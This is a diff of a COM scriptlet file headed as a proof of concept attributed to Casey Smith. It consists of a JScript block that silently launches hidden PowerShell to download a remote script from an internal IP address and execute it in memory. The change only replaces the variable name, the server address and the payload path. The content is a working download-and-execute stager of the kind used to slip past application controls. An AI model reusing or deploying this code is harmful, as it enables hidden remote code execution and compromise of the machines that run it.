@@ -6,7 +6,7 @@
      <!-- Proof Of Concept - Casey Smith @subTee --> 
      <!--  License: BSD3-Clause --> 
       <script language="JScript"> 
-        <![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $I=new-object net.webclient;$I.proxy=[Net.WebRequest]::GetSystemWebProxy();$I.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $I.downloadstring('http://192.168.88.1:8080/3Xymmp');"); ]]>
+        <![CDATA[ var r = new ActiveXObject("WScript.Shell").Run("powershell.exe -nop -w hidden -c $D=new-object net.webclient;$D.proxy=[Net.WebRequest]::GetSystemWebProxy();$D.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $D.downloadstring('http://192.168.81.1:8080/58vlKkP3H');"); ]]>
      </script>
    </registration>
   </scriptlet>
